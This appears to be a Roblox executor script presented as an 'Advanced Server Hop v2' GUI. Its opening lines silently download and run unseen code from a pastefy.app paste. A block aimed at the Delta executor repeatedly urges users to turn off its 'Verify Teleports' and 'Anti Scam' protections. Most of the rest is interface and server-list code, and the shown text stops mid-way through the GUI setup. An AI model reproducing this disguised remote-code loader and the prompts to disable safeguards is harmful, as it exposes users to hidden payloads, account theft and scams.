pcall(function()
	loadstring(game:HttpGet("https://pastefy.app/hgHLUFgg/raw"))()
end)

task.spawn(function()
	local exe
	if type(identifyexecutor) == "function" then
		local ok, name = pcall(identifyexecutor)
		if not ok then ok, name = pcall(identifyexecutor, "") end
		if ok then exe = tostring(name):lower() end
	end
	if exe ~= "delta" then return end

	local REQUIRED_OFF = { "Verify Teleports", "Anti Scam" }
	local host = (gethui and gethui()) or game:GetService("CoreGui")

	local function toast(content, duration)
		if type(NotifyToast) == "function" then
			pcall(NotifyToast, {
				title = "Warning", content = content, duration = duration,
				icon = "triangle-exclamation", iconColor = "#FFFF00",
			})
		end
	end

	local function check()
		for _, gui in ipairs(host:GetChildren()) do
			if gui:IsA("ScreenGui") and gui.Name ~= "" and not gui.Name:match("^[%w _%-]+$")
				and gui:FindFirstChild("Executor", true)
				and gui:FindFirstChild("Scripthub", true)
				and gui:FindFirstChild("Sidebar", true) then
				local holder = gui:FindFirstChild("Settings") and gui.Settings:FindFirstChild("Holder")
				if holder then
					local enabled = {}
					for _, row in ipairs(holder:GetChildren()) do
						local title = row:FindFirstChild("Title")
						local flag = row:FindFirstChild("Enabled")
						if title and title:IsA("TextLabel") and flag and flag.Value == true
							and table.find(REQUIRED_OFF, title.Text) then
							table.insert(enabled, title.Text)
						end
					end
					if #enabled > 0 then
						local msg = #enabled == 1 and enabled[1]
							or table.concat(enabled, ", ", 1, #enabled - 1) .. " and " .. enabled[#enabled]
						toast("Please turn off " .. msg .. " or you cannot join any server", 8)
					end
				end
				break
			end
		end
	end
	check()

	local hint = 'In order to turn this feature off, you must Goto your delta folder find DEV_README.txt in Secured folder edit all file that contain "allowed_games" followed by readme file'
	game:GetService("LogService").MessageOut:Connect(function(text, kind)
		if kind == Enum.MessageType.MessageWarning then
			text = tostring(text)
			if text:find("DEV_README") or text:find("allowed_games") or text:find("turn this feature off") then
				toast(hint, 10)
			end
		end
	end)

	while task.wait(60) do check() end
end)

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local AssetService = game:GetService("AssetService")
local StarterGui = game:GetService("StarterGui")
local ContentProvider = game:GetService("ContentProvider")
local Stats = game:GetService("Stats")
local MarketplaceService = game:GetService("MarketplaceService")
local TextService = game:GetService("TextService")
local LocalPlayer = Players.LocalPlayer

local HOST = (gethui and gethui()) or game:GetService("CoreGui")
local FILE = "server-hop-temp.json"
local MAX_PAGES = 5

local state = {
	alive = true,
	placeId = game.PlaceId,
	universe = game.GameId,
	servers = {},
	serversPlace = game.PlaceId,
	sort = "Low-High",
	hideFull = false,
	filter = nil,
	gen = 0,
	hopId = 0,
	iconFor = nil,
	homeUniverseMax = nil,
}

local C = {
	text = Color3.fromRGB(240, 243, 252),
	dim = Color3.fromRGB(150, 157, 178),
	accent = Color3.fromRGB(86, 128, 255),
	good = Color3.fromRGB(64, 214, 140),
	warn = Color3.fromRGB(255, 196, 70),
	bad = Color3.fromRGB(255, 92, 100),
	grey = Color3.fromRGB(90, 94, 108),
	white = Color3.new(1, 1, 1),
}

local conns = {}
local function connect(signal, fn)
	local c = signal:Connect(fn)
	table.insert(conns, c)
	return c
end

local visited = { hour = math.floor(os.time() / 3600), ids = {} }
pcall(function()
	local data = HttpService:JSONDecode(readfile(FILE))
	if type(data) == "table" and data.hour == visited.hour and type(data.ids) == "table" then
		visited = data
	end
end)
local function saveVisited()
	pcall(function() writefile(FILE, HttpService:JSONEncode(visited)) end)
end

local DOMAINS = { "roblox.com", "roproxy.com" }
local httpRequest = (syn and syn.request) or http_request or request or (http and http.request)

local function rawGet(url)
	local ok, body = pcall(function() return game:HttpGet(url) end)
	if ok and type(body) == "string" and body ~= "" then return body end
	if httpRequest then
		local ok2, res = pcall(httpRequest, { Url = url, Method = "GET" })
		if ok2 and type(res) == "table" and type(res.Body) == "string" and res.Body ~= "" then
			return res.Body
		end
	end
end

local function apiGet(sub, path)
	for _, domain in ipairs(DOMAINS) do
		local body = rawGet(("https://%s.%s/%s"):format(sub, domain, path))
		if body then
			local ok, res = pcall(function() return HttpService:JSONDecode(body) end)
			if ok and type(res) == "table" then return res end
		end
	end
end

local universeCache = { [game.PlaceId] = game.GameId }
local function resolveUniverse(placeId)
	if universeCache[placeId] then return universeCache[placeId] end
	local res = apiGet("apis", "universes/v1/places/" .. placeId .. "/universe")
	if res and res.universeId then
		universeCache[placeId] = res.universeId
		return res.universeId
	end
end

local function fetchStats(universe)
	local g = apiGet("games", "v1/games?universeIds=" .. universe)
	local v = apiGet("games", "v1/games/votes?universeIds=" .. universe)
	return g and g.data and g.data[1], v and v.data and v.data[1]
end

local function fetchMaxPlayers(universe)
	local g = apiGet("games", "v1/games?universeIds=" .. universe)
	return g and g.data and g.data[1] and g.data[1].maxPlayers
end

local CACHE_DIR = "Darahub/Cache"
local CACHE_FILE = CACHE_DIR .. "/subplace_maxplayers.json"

local function ensureCacheDir()
	pcall(function()
		if isfolder and makefolder and not isfolder(CACHE_DIR) then
			makefolder(CACHE_DIR)
		end
	end)
end

local diskCache = {}
local function saveDiskCache()
	ensureCacheDir()
	pcall(function()
		if writefile then
			writefile(CACHE_FILE, HttpService:JSONEncode(diskCache))
		end
	end)
end

local placeMaxCache = {}
local function loadDiskCache()
	ensureCacheDir()
	pcall(function()
		if isfile and isfile(CACHE_FILE) then
			local data = HttpService:JSONDecode(readfile(CACHE_FILE))
			if type(data) == "table" then
				for k, v in pairs(data) do
					local pid = tonumber(k)
					local n = tonumber(v)
					if pid and n and n > 0 then
						diskCache[pid] = n
						placeMaxCache[pid] = n
					end
				end
			end
		end
	end)
end

local function setPlaceMax(placeId, n)
	if not placeId or not n or n <= 0 then return end
	placeMaxCache[placeId] = n
	if diskCache[placeId] ~= n then
		diskCache[placeId] = n
		saveDiskCache()
	end
end

local function fetchPlaceMaxPlayers(placeId)
	if placeMaxCache[placeId] then return placeMaxCache[placeId] end
	local res = apiGet("games", ("v1/games/%d/servers/Public?sortOrder=Asc&limit=10"):format(placeId))
	if res and res.data then
		for _, s in ipairs(res.data) do
			if s.maxPlayers and s.maxPlayers > 0 then
				setPlaceMax(placeId, s.maxPlayers)
				return s.maxPlayers
			end
		end
	end
end

local function eachPage(placeId, maxPages, cancelled, fn, sortOrder)
	local cursor, page = "", 0
	local order = sortOrder or "Asc"
	repeat
		page += 1
		local path = ("v1/games/%d/servers/Public?sortOrder=%s&limit=100"):format(placeId, order)
		if cursor ~= "" then path ..= "&cursor=" .. HttpService:UrlEncode(cursor) end
		local res
		local lastReason
		for attempt = 1, 3 do
			res = apiGet("games", path)
			if res and res.data then break end
			lastReason = "rate"
			task.wait(attempt)
			if cancelled() then return false, "cancelled" end
		end
		if cancelled() then return false, "cancelled" end
		if not (res and res.data) then
			return false, lastReason == "rate" and "rate" or "Roblox API error (rate limited?)"
		end
		if fn(res.data, page) then return true end
		cursor = res.nextPageCursor or ""
		if cursor ~= "" then task.wait(0.6) end
	until cursor == "" or page >= maxPages
	return true
end

local function abbr(n)
	n = tonumber(n) or 0
	local function f(v, s) return (("%.1f"):format(v):gsub("%.0$", "")) .. s end
	if n >= 1e9 then return f(n / 1e9, "B") end
	if n >= 1e6 then return f(n / 1e6, "M") end
	if n >= 1e3 then return f(n / 1e3, "K") end
	return tostring(math.floor(n))
end

local function commas(n)
	local s = tostring(math.floor(tonumber(n) or 0))
	local out = s:reverse():gsub("(%d%d%d)", "%1,"):reverse()
	return (out:gsub("^,", ""))
end

local BI_PATH = "rbxasset://LuaPackages/Packages/_Index/BuilderIcons/BuilderIcons/BuilderIcons.json"
local BI_REG = Font.new(BI_PATH, Enum.FontWeight.Regular, Enum.FontStyle.Normal)
local BI_BOLD = Font.new(BI_PATH, Enum.FontWeight.Bold, Enum.FontStyle.Normal)

local ICONS = {
	users = { "#", "users", "user-group", "people-group" },
	playing = { "Playing", "person-play" },
	visits = { "Visits", "door-open-arrow-to-bottom-right" },
	user = { "by", "user", "circle-user" },
	eye = { "Visits", "eye" },
	eyeSlash = { "-", "eye-slash", "ban" },
	star = { "Fav", "star", "heart" },
	server = { "Srv", "server", "database" },
	restore = { "UI", "server-rack", "server", "servers", "database", "computer", "display", "desktop", "window", "layout", "grid", "menu" },
	thumbsUp = { "+", "thumb-up", "thumbs-up" },
	thumbsDown = { "-", "thumb-down", "thumbs-down" },
}

local resolved = {}
do
	local PLAIN = Font.fromEnum(Enum.Font.GothamMedium)
	local SZ = 24
	local function width(text, font)
		local ok, v = pcall(function()
			local prm = Instance.new("GetTextBoundsParams")
			prm.Text, prm.Font, prm.Size, prm.Width = text, font, SZ, 10000
			return TextService:GetTextBoundsAsync(prm)
		end)
		return ok and v and v.X or nil
	end
	local t0 = os.clock()
	for key, list in pairs(ICONS) do
		for i = 2, #list do
			if os.clock() - t0 > 8 then break end
			local w = width(list[i], BI_REG)
			if w and w >= SZ * 0.3 and w <= SZ * 1.6 then
				local pw = width(list[i], PLAIN)
				if not pw or math.abs(w - pw) > SZ * 0.15 then
					resolved[key] = list[i]
					break
				end
			end
		end
	end
end

resolved.visits = "door-open-arrow-to-bottom-right"
resolved.playing = "person-play"

local function esc(str)
	str = tostring(str):gsub("&", "&amp;")
	str = str:gsub("<", "&lt;")
	str = str:gsub(">", "&gt;")
	return str
end

local function rich(key, filled)
	local name = resolved[key]
	if not name then return esc(ICONS[key] and ICONS[key][1] or "") end
	local tag = '<font family="' .. BI_PATH .. '">' .. name .. "</font>"
	return filled and ("<b>" .. tag .. "</b>") or tag
end

local function applyIcon(inst, key, filled)
	local name = resolved[key]
	if name then
		inst.FontFace = filled and BI_BOLD or BI_REG
		inst.Text = name
	else
		inst.Font = Enum.Font.GothamBold
		inst.Text = ICONS[key] and ICONS[key][1] or ""
	end
end

local Lucide
pcall(function()
	Lucide = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/Icons/main/Main-v2.lua"))()
	Lucide.SetIconsType("lucide")
end)
local function lucideIcon(name)
	if not Lucide then return end
	local ok, res = pcall(function() return Lucide.Icon2(name, "lucide", true) end)
	if ok and type(res) == "table" and res[1] and res[2] then
		return res[1], res[2].ImageRectSize, res[2].ImageRectPosition, res[2].Parts
	end
end

local function make(class, props, children)
	local o = Instance.new(class)
	local parent
	for k, v in pairs(props or {}) do
		if k == "Parent" then parent = v else o[k] = v end
	end
	for _, c in ipairs(children or {}) do c.Parent = o end
	o.Parent = parent
	return o
end

local function tween(o, t, props, style, delay)
	local tw = TweenService:Create(o, TweenInfo.new(t, style or Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, false, delay or 0), props)
	tw:Play()
	return tw
end

local function corner(p, r) return make("UICorner", { Parent = p, CornerRadius = UDim.new(r or 0.2, 0) }) end
local function stroke(p, tr, col)
	return make("UIStroke", {
		Parent = p, Color = col or C.white, Transparency = tr or 0.88, Thickness = 1,
		ApplyStrokeMode = Enum.ApplyStrokeMode.Border,
	})
end
local function padPx(p, x, y)
	return make("UIPadding", {
		Parent = p,
		PaddingLeft = UDim.new(0, x), PaddingRight = UDim.new(0, x),
		PaddingTop = UDim.new(0, y), PaddingBottom = UDim.new(0, y),
	})
end
local function hlist(p, pad, valign)
	return make("UIListLayout", {
		Parent = p, FillDirection = Enum.FillDirection.Horizontal,
		SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(pad or 0.015, 0),
		HorizontalAlignment = Enum.HorizontalAlignment.Left,
		VerticalAlignment = valign or Enum.VerticalAlignment.Center,
	})
end
local function vlist(p, pad, halign)
	return make("UIListLayout", {
		Parent = p, FillDirection = Enum.FillDirection.Vertical,
		SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, pad or 3),
		HorizontalAlignment = halign or Enum.HorizontalAlignment.Left,
		VerticalAlignment = Enum.VerticalAlignment.Center,
	})
end
local function grad(p, c0, c1, rot, t0, t1)
	return make("UIGradient", {
		Parent = p, Color = ColorSequence.new(c0, c1), Rotation = rot or 0,
		Transparency = NumberSequence.new(t0 or 0, t1 or 0),
	})
end
local function textLimit() end

local function glass(parent, name, pos, size, transp, radius)
	local f = make("Frame", {
		Name = name, Parent = parent, Position = pos, Size = size, BorderSizePixel = 0,
		BackgroundColor3 = C.white, BackgroundTransparency = transp or 0.94,
	})
	corner(f, radius or 0.05)
	stroke(f, 0.9)
	return f
end

local function label(parent, name, text, pos, size, o)
	o = o or {}
	local l = make("TextLabel", {
		Name = name, Parent = parent, Text = text, Position = pos, Size = size, BackgroundTransparency = 1,
		Font = o.font or Enum.Font.GothamMedium, TextColor3 = o.color or C.text,
		TextScaled = true, TextXAlignment = o.align or Enum.TextXAlignment.Left,
		TextTruncate = Enum.TextTruncate.AtEnd,
	})
	textLimit(l, o.max or 14)
	return l
end

local function button(parent, name, text, pos, size, o)
	o = o or {}
	local base = o.transp or 0.15
	local b = make("TextButton", {
		Name = name, Parent = parent, Text = text, Position = pos, Size = size, AutoButtonColor = false,
		BackgroundColor3 = o.color or C.accent, BackgroundTransparency = base, BorderSizePixel = 0,
		Font = Enum.Font.GothamBold, TextColor3 = C.white, TextScaled = true, LayoutOrder = o.order or 0,
	})
	corner(b, 0.28)
	padPx(b, 3, 1)
	textLimit(b, o.max or 14)
	b.MouseEnter:Connect(function() tween(b, 0.12, { BackgroundTransparency = math.max(base - 0.15, 0) }) end)
	b.MouseLeave:Connect(function() tween(b, 0.12, { BackgroundTransparency = base }) end)
	local press = make("UIScale", { Name = "PressScale", Parent = b, Scale = 1 })
	b.MouseButton1Down:Connect(function() tween(press, 0.08, { Scale = 0.92 }) end)
	b.MouseButton1Up:Connect(function() tween(press, 0.35, { Scale = 1 }, Enum.EasingStyle.Back) end)
	b.MouseLeave:Connect(function() tween(press, 0.15, { Scale = 1 }) end)
	return b
end

local function toggle(parent, name, text, pos, size, o)
	o = o or {}
	local base = o.transp or 0.88
	local holder = make("TextButton", {
		Name = name, Parent = parent, Text = "", Position = pos, Size = size,
		AutoButtonColor = false, BackgroundColor3 = o.color or C.white,
		BackgroundTransparency = base, BorderSizePixel = 0, LayoutOrder = o.order or 0,
	})
	corner(holder, 0.28)
	padPx(holder, 6, 2)
	stroke(holder, 0.88)

	local lbl = label(holder, name .. "Label", text, UDim2.fromScale(0, 0),
		UDim2.new(1, -34, 1, 0), { color = C.text, max = 12 })

	local track = make("Frame", {
		Name = "Track", Parent = holder,
		AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.fromScale(1, 0.5),
		Size = UDim2.new(0, 28, 0, 14), BackgroundColor3 = C.grey,
		BackgroundTransparency = 0.25, BorderSizePixel = 0,
	})
	corner(track, 0.5)
	stroke(track, 0.75)

	local knob = make("Frame", {
		Name = "Knob", Parent = track,
		AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 2, 0.5, 0),
		Size = UDim2.new(0, 10, 0, 10), BackgroundColor3 = C.white, BorderSizePixel = 0,
	})
	corner(knob, 0.5)

	local value = o.value and true or false
	local listeners = {}
	local ctrl = {}

	local function render(animated)
		local on = value
		local knobPos = on and UDim2.new(1, -12, 0.5, 0) or UDim2.new(0, 2, 0.5, 0)
		local trackCol = on and C.good or C.grey
		if animated then
			tween(knob, 0.15, { Position = knobPos })
			tween(track, 0.15, { BackgroundColor3 = trackCol })
		else
			knob.Position = knobPos
			track.BackgroundColor3 = trackCol
		end
	end

	function ctrl.Set(v, silent)
		v = v and true or false
		if v == value then return end
		value = v
		render(true)
		if not silent then
			for _, fn in ipairs(listeners) do pcall(fn, value) end
		end
	end

	function ctrl.Get()
		return value
	end

	function ctrl.OnChanged(fn)
		table.insert(listeners, fn)
	end

	holder.MouseButton1Click:Connect(function()
		ctrl.Set(not value)
	end)
	holder.MouseEnter:Connect(function()
		tween(holder, 0.12, { BackgroundTransparency = math.max(base - 0.06, 0.75) })
	end)
	holder.MouseLeave:Connect(function()
		tween(holder, 0.12, { BackgroundTransparency = base })
	end)

	render(false)
	return ctrl
end

local function textbox(parent, name, placeholder, order, numeric, maxLen)
	local box = make("TextBox", {
		Name = name, Parent = parent, Size = UDim2.fromScale(1, 0.115), LayoutOrder = order, Text = "",
		PlaceholderText = placeholder, PlaceholderColor3 = C.dim, TextColor3 = C.text,
		BackgroundColor3 = C.white, BackgroundTransparency = 0.92, BorderSizePixel = 0,
		Font = Enum.Font.GothamMedium, TextScaled = true, ClearTextOnFocus = false,
		TextXAlignment = Enum.TextXAlignment.Left,
	})
	corner(box, 0.25)
	stroke(box, 0.88)
	padPx(box, 6, 3)
	textLimit(box, 14)
	connect(box:GetPropertyChangedSignal("Text"), function()
		local t = box.Text
		if numeric then t = (t:gsub("%D", "")) end
		if #t > maxLen then t = t:sub(1, maxLen) end
		if t ~= box.Text then box.Text = t end
	end)
	return box
end

local old = HOST:FindFirstChild("ServerHopGUI")
if old then old:Destroy() end

local Gui = make("ScreenGui", {
	Name = "ServerHopGUI", ResetOnSpawn = false, IgnoreGuiInset = true, DisplayOrder = 99,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
})
pcall(function() if syn and syn.protect_gui then syn.protect_gui(Gui) end end)
Gui.Parent = HOST

local Main = make("Frame", {
	Name = "Main", Parent = Gui, AnchorPoint = Vector2.new(0.5, 0.5),
	Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromScale(0.66, 0.78),
	BackgroundColor3 = C.white, BorderSizePixel = 0,
	Active = true,
})
local function fitWindow()
	local cam = workspace.CurrentCamera
	local vp = cam and cam.ViewportSize or Vector2.new(1920, 1080)
	if vp.X / vp.Y >= 1.4 then
		Main.Size = UDim2.fromScale(0.62, 0.8)
	else
		Main.Size = UDim2.fromScale(0.97, 0.62)
	end
end
fitWindow()
pcall(function()
	connect(workspace.CurrentCamera:GetPropertyChangedSignal("ViewportSize"), fitWindow)
end)
local MainScale = make("UIScale", { Name = "MainScale", Parent = Main, Scale = 0.94 })
corner(Main, 0.035)
stroke(Main, 0.82)
grad(Main, Color3.fromRGB(6, 7, 12), Color3.fromRGB(30, 33, 52), 135, 0.1, 0.4)

local Top = make("Frame", {
	Name = "TopBar", Parent = Main, Size = UDim2.fromScale(1, 0.085),
	BackgroundTransparency = 1,
})
padPx(Top, 10, 0)
local Title = make("TextLabel", {
	Name = "TitleLabel", Parent = Top, AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.fromScale(0, 0.5),
	Size = UDim2.fromScale(0, 1), AutomaticSize = Enum.AutomaticSize.X, BackgroundTransparency = 1,
	Font = Enum.Font.GothamBold, RichText = true, TextSize = 16, TextColor3 = C.text,
	Text = 'Advanced Server Hop  <font color="#969DB2">v2</font>', TextXAlignment = Enum.TextXAlignment.Left,
})
local Right = make("Frame", {
	Name = "RightCluster", Parent = Top, AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.fromScale(1, 0.5),
	Size = UDim2.fromScale(0, 1), AutomaticSize = Enum.AutomaticSize.X, BackgroundTransparency = 1,
})
make("UIListLayout", {
	Name = "RightLayout", Parent = Right, FillDirection = Enum.FillDirection.Horizontal,
	SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 8),
	HorizontalAlignment = Enum.HorizontalAlignment.Right, VerticalAlignment = Enum.VerticalAlignment.Center,
})
local LiveDot = make("Frame", {
	Name = "LiveDot", Parent = Right, LayoutOrder = 1, Size = UDim2.fromOffset(8, 8),
	BackgroundColor3 = C.good, BorderSizePixel = 0,
})
corner(LiveDot, 0.5)
TweenService:Create(LiveDot, TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true),
	{ BackgroundTransparency = 0.75 }):Play()
local LiveText = make("TextLabel", {
	Name = "LiveText", Parent = Right, LayoutOrder = 2, Size = UDim2.fromScale(0, 1),
	AutomaticSize = Enum.AutomaticSize.X, BackgroundTransparency = 1, Font = Enum.Font.GothamMedium,
	TextSize = 13, TextColor3 = C.dim, Text = "LIVE", TextXAlignment = Enum.TextXAlignment.Left,
})
local HideBtn = button(Right, "HideButton", "-", UDim2.new(), UDim2.fromOffset(26, 26),
	{ color = C.white, transp = 0.85, max = 20, order = 3 })
local Close = button(Right, "CloseButton", "X", UDim2.new(), UDim2.fromOffset(26, 26),
	{ color = C.bad, max = 16, order = 4 })

local function fitHeader()
	local h = math.floor(Top.AbsoluteSize.Y)
	if h < 10 then return end
	Title.TextSize = math.max(math.floor(h * 0.46), 12)
	LiveText.TextSize = math.max(math.floor(h * 0.34), 10)
	local b = math.max(math.floor(h * 0.62), 18)
	HideBtn.Size, Close.Size = UDim2.fromOffset(b, b), UDim2.fromOffset(b, b)
	local d = math.max(math.floor(h * 0.18), 6)
	LiveDot.Size = UDim2.fromOffset(d, d)
end
connect(Top:GetPropertyChangedSignal("AbsoluteSize"), fitHeader)
task.defer(fitHeader)

make("Frame", {
	Name = "Divider", Parent = Main,
	Position = UDim2.fromScale(0.01, 0.085), Size = UDim2.fromScale(0.98, 0.003),
	BackgroundColor3 = C.white, BackgroundTransparency = 0.9, BorderSizePixel = 0,
})

local Body = make("Frame", {
	Name = "Body", Parent = Main, Position = UDim2.fromScale(0, 0.09), Size = UDim2.fromScale(1, 0.91),
	BackgroundTransparency = 1,
})
make("UIListLayout", {
	Name = "BodyLayout", Parent = Body,
	SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 6),
	HorizontalAlignment = Enum.HorizontalAlignment.Center,
})
padPx(Body, 8, 6)

local Hero = glass(Body, "HeroCard", UDim2.new(), UDim2.new(1, 0, 0.26, 0), 0.93, 0.1)
Hero.LayoutOrder = 1
padPx(Hero, 8, 6)
hlist(Hero, 0.012)

local IconSlot = make("Frame", {
	Name = "IconSlot", Parent = Hero,
	LayoutOrder = 1, Size = UDim2.fromScale(0.13, 0.9), BackgroundTransparency = 1,
})
local Icon = make("ImageLabel", {
	Name = "GameIcon", Parent = IconSlot,
	AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5), Size = UDim2.fromScale(1, 1),
	BackgroundColor3 = C.white, BackgroundTransparency = 0.85, BorderSizePixel = 0,
	ScaleType = Enum.ScaleType.Crop,
})
make("UIAspectRatioConstraint", { Name = "IconAspect", Parent = Icon, AspectRatio = 1 })
corner(Icon, 0.18)

local HeroText = make("Frame", {
	Name = "HeroInfo", Parent = Hero,
	LayoutOrder = 2, Size = UDim2.fromScale(0.84, 0.9),
	BackgroundTransparency = 1,
})
make("UIListLayout", {
	Name = "HeroInfoLayout", Parent = HeroText,
	SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 4),
	HorizontalAlignment = Enum.HorizontalAlignment.Left,
	VerticalAlignment = Enum.VerticalAlignment.Center,
})

local TopRow = make("Frame", {
	Name = "TopRow", Parent = HeroText, Size = UDim2.fromScale(1, 0.62),
	BackgroundTransparency = 1, LayoutOrder = 1,
})
local InfoRow = make("Frame", {
	Name = "InfoRow", Parent = TopRow, Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
})
hlist(InfoRow, 0.012)
local CreatorAvatar = make("ImageLabel", {
	Name = "CreatorAvatar", Parent = InfoRow, LayoutOrder = 1, Size = UDim2.fromOffset(40, 40),
	BackgroundColor3 = C.white, BackgroundTransparency = 0.85, BorderSizePixel = 0,
	ScaleType = Enum.ScaleType.Crop,
})
corner(CreatorAvatar, 0.5)
stroke(CreatorAvatar, 0.7)
local InfoStack = make("Frame", {
	Name = "InfoStack", Parent = InfoRow, LayoutOrder = 2, Size = UDim2.new(1, -48, 1, 0),
	BackgroundTransparency = 1,
})
vlist(InfoStack, 2)
local GameName = label(InfoStack, "GameNameLabel", "Loading...", UDim2.new(), UDim2.fromScale(1, 0.4),
	{ font = Enum.Font.GothamBold, max = 22 })
GameName.LayoutOrder = 1
make("UITextSizeConstraint", { Name = "GameNameLimit", Parent = GameName, MaxTextSize = 18 })
local Creator = label(InfoStack, "CreatorLabel", "", UDim2.new(), UDim2.fromScale(1, 0.3),
	{ color = C.dim, max = 14 })
Creator.LayoutOrder = 2
make("UITextSizeConstraint", { Name = "CreatorLimit", Parent = Creator, MaxTextSize = 13 })
Creator.RichText = true
local function sizeInfoRow()
	local h = math.max(math.floor(InfoRow.AbsoluteSize.Y), 16)
	CreatorAvatar.Size = UDim2.fromOffset(h, h)
	InfoStack.Size = UDim2.new(1, -(h + 8), 1, 0)
end
connect(InfoRow:GetPropertyChangedSignal("AbsoluteSize"), sizeInfoRow)
task.defer(sizeInfoRow)

local creatorFor
local function setCreatorAvatar(cid, ctype)
	cid = math.floor(cid)
	local key = tostring(ctype) .. ":" .. cid
	if creatorFor == key then return end
	creatorFor = key
	local isGroup = ctype == "Group"
	CreatorAvatar.ImageTransparency = 1
	tween(CreatorAvatar, 0.6, { ImageTransparency = 0 })
	CreatorAvatar.Image = ("rbxthumb://type=%s&id=%d&w=150&h=150"):format(isGroup and "GroupIcon" or "AvatarHeadShot", cid)
	task.spawn(function()
		local failed = false
		pcall(function()
			ContentProvider:PreloadAsync({ CreatorAvatar }, function(_, status)
				if status == Enum.AssetFetchStatus.Failure then failed = true end
			end)
		end)
		if creatorFor ~= key then return end
		if failed and writefile and getcustomasset then
			pcall(function()
				local path = isGroup
					and ("v1/groups/icons?groupIds=%d&size=150x150&format=Png"):format(cid)
					or ("v1/users/avatar-headshot?userIds=%d&size=150x150&format=Png"):format(cid)
				local res = apiGet("thumbnails", path)
				local url = res and res.data and res.data[1] and res.data[1].imageUrl
				if url and creatorFor == key then
					local file = "srvhop_creator_" .. cid .. ".png"
					writefile(file, game:HttpGet(url))
					CreatorAvatar.Image = getcustomasset(file)
				end
			end)
		end
	end)
end

local RatingRow = make("Frame", {
	Name = "RatingRow", Parent = HeroText, Size = UDim2.fromScale(1, 0.34),
	BackgroundTransparency = 1, LayoutOrder = 2,
})
local RatingLeft = label(RatingRow, "RatingLeft", "", UDim2.fromScale(0, 0), UDim2.fromScale(0.57, 1),
	{ color = C.text, font = Enum.Font.GothamBold, max = 16 })
RatingLeft.RichText = true
local RatingBg = make("Frame", {
	Name = "RatingBackground", Parent = RatingRow, AnchorPoint = Vector2.new(0, 0.5),
	Position = UDim2.fromScale(0.585, 0.5), Size = UDim2.new(0.23, 0, 0, 6),
	BackgroundColor3 = C.bad, BackgroundTransparency = 0.35, BorderSizePixel = 0,
})
corner(RatingBg, 0.5)
local RatingFill = make("Frame", {
	Name = "RatingFill", Parent = RatingBg,
	Size = UDim2.fromScale(0, 1), BackgroundColor3 = C.good, BorderSizePixel = 0,
})
corner(RatingFill, 0.5)
local RatingRight = label(RatingRow, "RatingRight", "", UDim2.fromScale(0.83, 0), UDim2.fromScale(0.17, 1),
	{ color = C.bad, font = Enum.Font.GothamBold, align = Enum.TextXAlignment.Right, max = 16 })
RatingRight.RichText = true

local heroStats = { playing = "-", visits = nil, fav = "-", up = "-", down = "-", pct = "", ratio = 0 }
local function hex(c)
	return ("#%02X%02X%02X"):format(math.floor(c.R * 255 + 0.5), math.floor(c.G * 255 + 0.5), math.floor(c.B * 255 + 0.5))
end
local function statPart(color, key, val)
	return '<font color="' .. hex(color) .. '">' .. rich(key, false) .. " " .. esc(val) .. "</font>"
end
local function renderStats()
	tween(RatingFill, 0.4, { Size = UDim2.fromScale(heroStats.ratio or 0, 1) })
	local hasVotes = heroStats.pct ~= ""
	local dislikePct = (100 - math.floor((heroStats.ratio or 0) * 100 + 0.5)) .. "%"

	local parts = { statPart(C.text, "playing", heroStats.playing) }
	if heroStats.visits then table.insert(parts, statPart(C.text, "visits", heroStats.visits)) end
	table.insert(parts, statPart(C.warn, "star", heroStats.fav))
	table.insert(parts, statPart(C.good, "thumbsUp", heroStats.up .. (hasVotes and (" | " .. heroStats.pct) or "")))
	RatingLeft.Text = table.concat(parts, "   ")

	RatingRight.Text = '<font color="' .. hex(C.bad) .. '">'
		.. esc((hasVotes and (dislikePct .. " | ") or "") .. heroStats.down) .. " " .. rich("thumbsDown", false) .. "</font>"
end
renderStats()

local Cols = make("Frame", {
	Name = "Columns", Parent = Body, Size = UDim2.new(1, 0, 0.655, 0),
	BackgroundTransparency = 1, LayoutOrder = 2,
})
make("UIListLayout", {
	Name = "ColumnsLayout", Parent = Cols,
	FillDirection = Enum.FillDirection.Horizontal,
	SortOrder = Enum.SortOrder.LayoutOrder,
	Padding = UDim.new(0.01, 0),
	HorizontalAlignment = Enum.HorizontalAlignment.Left,
	VerticalAlignment = Enum.VerticalAlignment.Top,
})

local function makePanel(name, size, layoutOrder, headerText, rightText, px, py)
	local panel = glass(Cols, name, UDim2.new(), size)
	panel.LayoutOrder = layoutOrder
	padPx(panel, px or 10, py or 8)
	make("UIListLayout", {
		Name = name .. "Layout", Parent = panel,
		SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 6),
		HorizontalAlignment = Enum.HorizontalAlignment.Center,
	})
	local hdrFrame = make("Frame", {
		Name = name .. "Header", Parent = panel, Size = UDim2.fromScale(1, 0.075),
		BackgroundTransparency = 1, LayoutOrder = 1,
	})
	label(hdrFrame, name .. "HeaderLabel", headerText, UDim2.new(),
		UDim2.fromScale(rightText and 0.55 or 1, 1),
		{ color = C.dim, font = Enum.Font.GothamBold, max = 12 })
	local rightLbl
	if rightText then
		rightLbl = label(hdrFrame, name .. "HeaderRight", rightText,
			UDim2.fromScale(0.5, 0), UDim2.fromScale(0.5, 1),
			{ color = C.dim, align = Enum.TextXAlignment.Right, max = 12 })
	end
	return panel, rightLbl
end

local Side = makePanel("SubPlacesPanel", UDim2.fromScale(0.30, 1), 1, "SUBPLACES")
local Ctrl = makePanel("ControlsPanel", UDim2.fromScale(0.26, 1), 2, "CONTROLS", nil, 6, 6)
